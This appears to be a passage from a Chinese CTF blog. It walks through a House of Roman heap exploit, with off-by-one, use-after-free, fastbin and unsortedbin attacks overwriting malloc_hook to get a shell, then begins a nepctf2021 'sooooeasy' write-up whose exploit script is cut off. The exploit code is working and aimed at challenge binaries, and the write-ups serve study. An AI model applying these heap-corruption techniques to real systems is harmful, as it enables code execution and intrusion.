<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    v5 = malloc_chunk(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    write_chunk(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Free&quot;</span>);</span><br><span class="line">    free_chunk();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>malloc_chunk：用户输入 <code>size</code>, 然后 <code>malloc(size)</code> , 大小不限</li>
<li>write_chunk：往指定 <code>heap_ptr</code> 写入 <code>size+1</code> 字节数据，off-by-one（<code>Write</code>时只是校验指针是否为<code>0</code>）</li>
<li>free_chunk：调用 <code>free</code> 释放掉 <code>heap_ptr</code> ，不过没有清零，<code>double free</code> 和 <code>uaf</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>(heap_ptrs[(<span class="keyword">unsigned</span> __int64)v0]); <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保护如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">04</span>:<span class="number">44</span> haclh@ubuntu:house_of_roman $ checksec ./new_chall</span><br><span class="line">[*] <span class="string">&#x27;/home/haclh/workplace/house_of_roman/new_chall&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p><strong>分析外国老哥的exp：</strong></p>
<p>一，分配 <code>3</code> 个 <code>chunk</code> ，在 <code>chunk2 + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ，用于后面 的 <code>fastbin attack</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># chunk1 </span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2 </span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">2</span>) <span class="comment"># chunk3 </span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;create 2 chunk, 0x20, 0xd8&quot;</span>)</span><br><span class="line">fake = <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake) <span class="comment"># set fakesize:0x71</span></span><br><span class="line">info(<span class="string">&quot;fake&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>二，释放掉 <code>chunk2</code> , 然后分配同样大小再次分配到 <code>chunk2</code> , 此时 <code>chunk2+0x10</code> 和 <code>chunk2+0x18</code> 中有 <code>main_arean</code> 的地址，分配 <code>3</code> 个 <code>fastbin</code> ，利用 <code>off-by-one</code> 修改 <code>chunk2-&gt;size = 0x71</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>) <span class="comment"># chunk2 to unsortedbin</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2 new(include main_arena+88)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">3</span>) <span class="comment"># chunk4</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">15</span>) <span class="comment"># chunk16</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">18</span>) <span class="comment"># chunk19</span></span><br><span class="line"></span><br><span class="line">over = <span class="string">&quot;A&quot;</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over) <span class="comment"># set chunk2-&gt;size =&gt; 0x71(编辑chunk1,溢出到chunk2)</span></span><br><span class="line">info(<span class="string">&quot;利用 off by one ,  chunk2&#x27;s size --&gt; 0x71&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这里的 off-by-one 保证了 chunk2 可以进入大小为“0x70~0x80”的 fastbin</p>
<p>这样“main_arena+88”就会进入 fastbin 了（方便后续的 UAF 进行修改）</p>
<p>三，生成两个 <code>fastbin</code> ，然后利用 <code>uaf</code> ，部分地址写，把 <code>chunk1</code> 链入到 <code>fastbin</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">info(<span class="string">&quot;创建两个 0x70 的 fastbin&quot;</span>)</span><br><span class="line">heap_po = <span class="string">&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line">info(<span class="string">&quot;把 chunk1 链入到 fastbin 里面&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span>: <span class="number">0x555555757160</span> —▸ <span class="number">0x555555757020</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x7ffff7dd1b78</span></span><br></pre></td></tr></table></figure>
<ul>
<li>0x555555757160 就是 chunk4</li>
<li>0x555555757020 就是 chunk1(原本该是chunk3,但是末尾字节被覆盖了) </li>
</ul>
<p>四，通过修改 <code>chunk1-&gt;fd</code> 的低 <code>2</code> 字节， 使得 <code>chunk1-&gt;fd= malloc_hook - 0x23</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">&quot;\xed\x1a&quot;</span> <span class="comment"># 该地址为 malloc_hook 上方</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line">info(<span class="string">&quot;部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>即把“main_arena+88”覆盖为“malloc_hook - 0x23”</p>
<p>五，然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk</code> ，就可以拿到 <code>malloc_hook</code> 所在的那个 <code>chunk</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">info(<span class="string">&quot;0 拿到了 malloc_hook&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>注意：这里设置的是“malloc_hook - 0x23”，存在“\x7f”来通过检查</p>
<p>六，释放掉 <code>chunk16</code> ，进入 <code>fastbin</code> ，利用 <code>uaf</code> 设置 <code>chunk16-&gt;fd = 0</code> ， 修复了 <code>fastbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>)) </span><br><span class="line">info(<span class="string">&quot;再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>现在 fastbin 中只留有 chunk16 的地址（这个“修复”是什么意思，没有搞明白）</p>
<p>七，unsortedbin attack，使得 malloc_hook 被写入 main_arena+88 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>) <span class="comment"># chunk3</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>) <span class="comment"># chunk4</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>) <span class="comment"># chunk5</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 大小为&quot;0xc8+0x10&quot;的chunk2进入unsortedbin</span></span><br><span class="line">po = <span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">&quot;\x00\x1b&quot;</span> <span class="comment"># 覆写FD的低地址,使其变为malloc_hook</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># 把chunk2申请回来,使malloc_hook变成unsortedbin中的最后一个chunk</span></span><br><span class="line">info(<span class="string">&quot;unsorted bin 使得 malloc_hook 有 libc 的地址&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>根据 unsortedbin 的特性，它会向 <code>第一个chunk</code> 和 <code>最后一个chunk</code> 中写入 <code>main_arena+xx</code> ，修改其FD指向 <code>malloc_hook</code> ，<code>最后一个chunk</code> 就变为了 <code>malloc_hook</code> ，当然会被写入 <code>main_arena+88</code></p>
<p>八，修改 <code>malloc_hook</code> 的低三个字节 ，使得 <code>malloc_hook</code> 为 <code>one_gadget</code> 的地址 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">over = <span class="string">&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">&quot;\xa4\xd2\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;malloc_hook to one_gadget&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>九，然后 <code>free</code> 两次同一个 <code>chunk</code> ，触发 <code>malloc_printerr</code> ， <code>getshell</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br></pre></td></tr></table></figure>
<p>上面的偏移均为调试所得，开启 <code>aslr</code> 后，需要爆破程序</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>UAF（对 fastbin 中的“main_arena+xx”进行修改，使其指向目标地址）</li>
<li>off-by-one（覆写“size”的大小，为了使保留有“main_arena+xx”进入fastbin）</li>
</ul>
<h2 id="版本对-House-Of-Roman-的影响"><a href="#版本对-House-Of-Roman-的影响" class="headerlink" title="版本对 House Of Roman 的影响"></a>版本对 House Of Roman 的影响</h2><p>House Of Roman 并不依赖于 libc 源码，它的思想完全可以独立使用（覆盖main_arena）</p>
<p>但是实现 House Of Roman 需要 fastbin attack，unsortedbin attack 等技术的配合，而它们会受 libc 版本影响：</p>
<p><strong>libc-2.27</strong></p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 可以直接打（只检查了“victim-&gt;size”，形同虚设）</li>
</ul>
<p><strong>libc-2.29</strong></p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 失效（其实也有办法可以绕过，只是条件苛刻）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/IO_2_1_stdout%20leak+Double%20free/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/IO_2_1_stdout%20leak+Double%20free/" class="post-title-link" itemprop="url">_IO_2_1_stdout_ leak+Double free</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-13 12:11:51" itemprop="dateCreated datePublished" datetime="2022-03-13T12:11:51+08:00">2022-03-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-24 11:37:52" itemprop="dateModified" datetime="2022-07-24T11:37:52+08:00">2022-07-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>nepctf2021 sooooeasy 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./sooooeasy </span><br><span class="line">   NN     NN    EEEEEEEE    PPPPPP   </span><br><span class="line">   NNNN   NN    EE          PP   PP  </span><br><span class="line">   NN NN  NN    EEEEEEE     PPPPPP   </span><br><span class="line">   NN  NN NN    EE          PP       </span><br><span class="line">   NN   NNNN    EE          PP       </span><br><span class="line">   NN    NNN    EEEEEEEE    PP       </span><br><span class="line"></span><br><span class="line">   PLEASE SIGN IN:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Add</span><br><span class="line"><span class="number">2.</span> Delete</span><br><span class="line"><span class="number">3.</span> Exit</span><br><span class="line">Your choice : </span><br></pre></td></tr></table></figure>
<p>标准堆模板（看上去没有“打印模块”和“修改模块”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sooooeasy: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">01</span>a6d58e17059a67f6576746d73859db1943e557, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/sooooeasy&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Null!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;mumber&#x27;s index:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">0x13</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)chunk_list[index] = <span class="number">0</span>;           <span class="comment">// 置空inuse,释放name</span></span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(chunk_list[index] + <span class="number">8LL</span>));  <span class="comment">// UAF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Deleted!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index error!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>明显的UAF</p>
<p><strong>heap结构</strong></p>
<p>本题目有以下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_block</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> *name;</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>具体存储结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;1111&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;2222&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;3333&#x27;</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x5638534cc000</span></span><br><span class="line"><span class="number">0x5638534cc000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// chunk_block1</span></span><br><span class="line"><span class="number">0x5638534cc010</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005638534cc040</span> <span class="comment">// addr of name1</span></span><br><span class="line"><span class="number">0x5638534cc020</span>:	<span class="number">0x0000000061616161</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// name1</span></span><br><span class="line"><span class="number">0x5638534cc040</span>:	<span class="number">0x0000000a31313131</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// chunk_block2</span></span><br><span class="line"><span class="number">0x5638534cc070</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005638534cc0a0</span> <span class="comment">// addr of name2</span></span><br><span class="line"><span class="number">0x5638534cc080</span>:	<span class="number">0x0000000062626262</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// name2</span></span><br><span class="line"><span class="number">0x5638534cc0a0</span>:	<span class="number">0x0000000a32323232</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// chunk_block2</span></span><br><span class="line"><span class="number">0x5638534cc0d0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005638534cc100</span> <span class="comment">// addr of name2</span></span><br><span class="line"><span class="number">0x5638534cc0e0</span>:	<span class="number">0x0000000063636363</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">// name2</span></span><br><span class="line"><span class="number">0x5638534cc100</span>:	<span class="number">0x0000000a33333333</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5638534cc120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ee1</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>本题的完全没法泄露信息，看来我的独立解题就到此为止了，接下来学习大佬的操作</p>
<p>​        // 如果可以 leak 出 libc_base，就可以打 Double free </p>
<p>大佬的exp：（大佬显然想打爆破，学习了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size,name=<span class="string">&#x27;a&#x27;</span>,message=<span class="string">&#x27;b&#x27;</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;your name: \n&#x27;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Your name:\n&#x27;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your message:\n&#x27;</span>,message)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">a,addr</span>):</span></span><br><span class="line">	log.success(a+<span class="string">&#x27;===&gt;&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment"># over 